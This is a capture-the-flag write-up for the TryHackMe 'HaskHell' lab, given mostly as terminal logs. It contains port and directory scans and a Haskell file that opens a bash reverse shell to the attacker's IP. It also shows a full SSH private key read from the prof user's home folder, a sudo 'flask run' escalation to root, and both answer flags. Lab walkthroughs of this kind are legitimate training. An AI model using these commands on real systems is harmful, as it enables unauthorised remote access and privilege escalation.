----
Teach your CS professor that his PhD isn't in security.
----

![](https://i.imgur.com/4AocURG.jpg)

![222](https://tryhackme-images.s3.amazonaws.com/room-icons/fcf1ff6eabd1d1e09500184b049a2e66.png)


### Task 1  HaskHell

 Start Machine

Show your professor that his PhD isn't in security.

Please send comments/concerns/hatemail to @passthehashbrwn on Twitter.

Answer the questions below

```
┌──(witty㉿kali)-[~/Downloads]
└─$ rustscan -a 10.10.99.121 --ulimit 5500 -b 65535 -- -A -Pn
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
🌍HACK THE PLANET🌍

[~] The config file is expected to be at "/home/witty/.rustscan.toml"
[~] Automatically increasing ulimit value to 5500.
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
Open 10.10.99.121:22
Open 10.10.99.121:5001
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
[~] Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-22 13:55 EDT
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 13:55
Completed NSE at 13:55, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 13:55
Completed NSE at 13:55, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 13:55
Completed NSE at 13:55, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 13:55
Completed Parallel DNS resolution of 1 host. at 13:55, 0.02s elapsed
DNS resolution of 1 IPs took 0.03s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 13:55
Scanning 10.10.99.121 [2 ports]
Discovered open port 22/tcp on 10.10.99.121
Discovered open port 5001/tcp on 10.10.99.121
Completed Connect Scan at 13:55, 0.20s elapsed (2 total ports)
Initiating Service scan at 13:55
Scanning 2 services on 10.10.99.121
Completed Service scan at 13:55, 17.45s elapsed (2 services on 1 host)
NSE: Script scanning 10.10.99.121.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 13:55
Completed NSE at 13:56, 8.43s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 13:56
Completed NSE at 13:56, 0.96s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 13:56
Completed NSE at 13:56, 0.00s elapsed
Nmap scan report for 10.10.99.121
Host is up, received user-set (0.20s latency).
Scanned at 2023-06-22 13:55:40 EDT for 27s

PORT     STATE SERVICE REASON  VERSION
22/tcp   open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 1df353f76d5ba1d484510ddd66404d90 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQD6azVu3Hr+20SblWk0j7SeT8U3VySD4u18ChyDYyOoZiza2PTe1qsuwnw06/kboHaLejqPmnxkMDWgEeXoW0L11q2D8mfSf8EVvk++7bNqQ0mlkjdcknOs11mdYqSOkM1yw06LolltKtjlf/FpT706QFkRKQO30fT4YgKY6GD71aYdafhTBgZlXA51pGyruDUOP+lqhVPvLZJnI/oOTWkv5kT0a3T+FGRZfEi+GBrhvxP7R7n3QFRSBDPKSBRYLVdlSYXPD83P1pND6F/r3BvyfHw4UY0yKbw+ntvhiRcUI2FYyN5Vj1Jrb6ipCnp5+UcFdmROOHSgWS5Qzzx5fPZB
|   256 267cbd338fbf09ac9ee3d30ac334bc14 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBMx1lBsNtSWJvxM159Ahr110Jpf3M/dVqblDAoVXd8QSIEYIxEgeqTdbS4HaHPYnFyO1j8s6fQuUemJClGw3Bh8=
|   256 d5fb55a0fde8e1ab9e46afb871900026 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICPmznEBphODSYkIjIjOA+0dmQPxltUfnnCTjaYbc39R
5001/tcp open  http    syn-ack Gunicorn 19.7.1
|_http-server-header: gunicorn/19.7.1
|_http-title: Homepage
| http-methods: 
|_  Supported Methods: HEAD GET OPTIONS
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 13:56
Completed NSE at 13:56, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 13:56
Completed NSE at 13:56, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 13:56
Completed NSE at 13:56, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 28.51 seconds

                                                                                                                    
┌──(witty㉿kali)-[~/Downloads]
└─$ dirsearch -u http://10.10.99.121:5001 -i200,301,302,401,500                                        

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927

Output File: /home/witty/.dirsearch/reports/10.10.99.121-5001/_23-06-22_14-00-33.txt

Error Log: /home/witty/.dirsearch/logs/errors-23-06-22_14-00-33.log

Target: http://10.10.99.121:5001/

[14:00:33] Starting: 
[14:03:14] 200 -  237B  - /submit
[14:03:22] 200 -  131B  - /uploads/affwp-debug.log

Task Completed


┌──(witty㉿kali)-[~/Downloads]
└─$ nano revshell_haskell.hs
                                                 
┌──(witty㉿kali)-[~/Downloads]
└─$ cat revshellhaskell.hs 
import System.Process

main = do
     callCommand "bash -c 'bash -i >& /dev/tcp/10.8.19.103/4444 0>&1'"

┌──(witty㉿kali)-[~/Downloads]
└─$ rlwrap nc -lvnp 4444                     
listening on [any] 4444 ...
connect to [10.8.19.103] from (UNKNOWN) [10.10.99.121] 45358
bash: cannot set terminal process group (793): Inappropriate ioctl for device
bash: no job control in this shell
flask@haskhell:~$ which python
which python
/usr/bin/python
flask@haskhell:~$ python -c 'import pty;pty.spawn("/bin/bash")'
python -c 'import pty;pty.spawn("/bin/bash")'
flask@haskhell:~$ ls
ls
app.py  app.pyc  __pycache__  uploads
flask@haskhell:~$ cd /home
cd /home
flask@haskhell:/home$ ls
ls
flask  haskell  prof
flask@haskhell:/home$ cd prof
cd prof
flask@haskhell:/home/prof$ ls
ls
__pycache__  user.txt
flask@haskhell:/home/prof$ cat user.txt
cat user.txt
flag{academic_dishonesty}

flask@haskhell:/home/prof$ ls -lah
ls -lah
total 44K
drwxr-xr-x 7 prof prof 4.0K May 27  2020 .
drwxr-xr-x 5 root root 4.0K May 27  2020 ..
-rw-r--r-- 1 prof prof  220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 prof prof 3.7K Apr  4  2018 .bashrc
drwx------ 2 prof prof 4.0K May 27  2020 .cache
drwx------ 4 prof prof 4.0K May 27  2020 .gnupg
drwxrwxr-x 3 prof prof 4.0K May 27  2020 .local
-rw-r--r-- 1 prof prof  807 Apr  4  2018 .profile
drwxrwxr-x 2 prof prof 4.0K May 27  2020 __pycache__
drwxr-xr-x 2 prof prof 4.0K May 27  2020 .ssh
-rw-r--r-- 1 root root   26 May 27  2020 user.txt
flask@haskhell:/home/prof$ cd .ssh
cd .ssh
flask@haskhell:/home/prof/.ssh$ ls
ls
authorized_keys  id_rsa  id_rsa.pub
flask@haskhell:/home/prof/.ssh$ cat id_rsa
cat id_rsa
-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEA068E6x8/vMcUcitx9zXoWsF8WjmBB04VgGklNQCSEHtzA9cr
94rYpUPcxxxYyw/dAii0W6srQuRCAbQxO5Di+tv9aWXmBGMEt0/3tOE7D09RhZGQ
b68lAFDjSSJaVlVzPi+waotyP2ccVJDjXkwK0KIm6RsACIOhM9GtI2wyZ6vOg4ss
Nb+7UY60iOkcOAWP09Omzjc2q7hcE6CuV6f7+iObamfGlZ4QQ5IvUj0etStDD6iU
WQX4vYewYqUz8bedccFvpC6uP2FGvDONYXrLWWua7wlwSgOqeXXxkG7fxVqYY2++
6ZVm8RE7TpPNxsQNDwpnxOiwTxGMgCrIMxgRVwIDAQABAoIBAQCTLXbf+wQXvtrq
XmaImQSKRUiuepjJeXLdqz1hUpo7t3lKTEqXfAQRM9PG5GCgHtFs9NwheCtGAOob
wSsR3TTTci0JIP4CQs4+nez96DNl+6IUmhawcDfrtlGwwZ/JsvPDYujnyziN+KTr
7ykGoRxL3tHq9Qja4posKzaUEGAjTz8NwrhzB6xatsmcWBV0fFoWzpS/xWzW3i7F
gAoYxc6+4s5bKHsJima2Aj5F3XtHfipkMdBvbl+sjGllgiQn/oEjYMIX5wc7+se2
o7FERO2oy3I5jUOlULsr9BwQpNFA2Qenc4Wc7ghb0LfCVaUs/RHQ7IQ4F3yp/G67
54oLue6hAoGBAPCe+WsnOXzhwQ9WXglhfztDR1lcwSFMeHZpcxYUVqmVEi2ZMLll
B67SCri9lHHyvBtrH7YmZO5Q9UcGXdLCZGmbkJUdX2bjqV0zwwx1qOiVY8LPnZSJ
LJN+0p1dRHsO3n4vTHO8mVuiM5THi6pcgzSTggIhS+e1ks7nlQKiBuD/AoGBAOE2
kwAMtvI03JlkjvOHsN5IhMbOXP0zaRSrKZArDCcqDojDL/AQltQkkLtQPdUPJgdY
3gOkUJ2BCHNlIsAtUjrTj+T76N512rO2sSidOEXRDCc+g/QwdgENiq/w9JroeWFc
g9qM3f2cl/EkjxRgiyuTfK6mbzcuMSveX4LfCXepAoGAd2MZc+4ZWvoUNUzwCY2D
eF8QVqlr9d6gYng9rvXWbfvV8iPxBfu3zSjQQwtlTQhYBu6m5FS2fXxTxrLE+J6U
/cU+/o19WWqaDPFy1IrIjOYagn1KvXk2UdR6IbQ2FyywfkFvmHk6Sjn3h9leVd/j
BcIunmnw5H214s0KpSzJZvcCgYA5Ca9VNeMnmIe+OZ+Swezjfw5Ro3YdkmWsnGTc
ZGqhiJ9Bt91uOWVZuSEGr53ZVgrVlYY0+eqI2WMghp60eUX4LBinb71cihCnrz9S
/+5+kCE51zVoJNXeEmXrhWUNzo7fP6UNNtwKHRzGL/IkwQa+NI5BVVmZahN9/sXF
yWMGcQKBgQDheyI7eKTDMsrEXwMUpl5aiwWPKJ0gY/2hS0WO3XGQtx6HBwg6jJKw
MMn8PNqYKF3DWex59PYiy5ZL1pUG2Y+iadGfIbStSZzN4nItF5+yC42Q2wlhtwgt
i4MU8bepL/GTMgaiR8RmU2qY7wRxfK2Yd+8+GDuzLPEoS7ONNjLhNA==
-----END RSA PRIVATE KEY-----

┌──(witty㉿kali)-[~/Downloads]
└─$ nano hashkell_idrsa
                                                                                      
┌──(witty㉿kali)-[~/Downloads]
└─$ chmod 600 hashkell_idrsa 
                                                                                      
┌──(witty㉿kali)-[~/Downloads]
└─$ ssh -o PubkeyAcceptedKeyTypes=ssh-rsa -i hashkell_idrsa prof@10.10.99.121 
The authenticity of host '10.10.99.121 (10.10.99.121)' can't be established.
ED25519 key fingerprint is SHA256:xyAIXuikZy0VMzG4iXfmLFW3JgM4qzXc2/DTQrtqpAg.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.99.121' (ED25519) to the list of known hosts.
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-101-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Thu Jun 22 18:16:15 UTC 2023

  System load:  0.08               Processes:           98
  Usage of /:   26.2% of 19.56GB   Users logged in:     0
  Memory usage: 46%                IP address for eth0: 10.10.99.121
  Swap usage:   0%


39 packages can be updated.
0 updates are security updates.


Last login: Wed May 27 18:45:06 2020 from 192.168.126.128
$ whoami
prof
$ bash

prof@haskhell:~$ sudo -l
Matching Defaults entries for prof on haskhell:
    env_reset, env_keep+=FLASK_APP, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User prof may run the following commands on haskhell:
    (root) NOPASSWD: /usr/bin/flask run

prof@haskhell:~$ sudo /usr/bin/flask run
Usage: flask run [OPTIONS]

Error: Could not locate Flask application. You did not provide the FLASK_APP environment variable.

For more information see http://flask.pocoo.org/docs/latest/quickstart/

prof@haskhell:~$ echo 'import pty;pty.spawn("/bin/bash")' > root.py
prof@haskhell:~$ cat root.py 
import pty;pty.spawn("/bin/bash")
prof@haskhell:~$ export FLASK_APP=root.py

prof@haskhell:~$ sudo /usr/bin/flask run
root@haskhell:~# cd /root
root@haskhell:/root# ls
root.txt
root@haskhell:/root# cat root.txt 
flag{im_purely_functional}


```

Get the flag in the user.txt file.  

*flag{academic_dishonesty}*

Obtain the flag in root.txt

*flag{im_purely_functional}*

[[ConvertMyVideo]]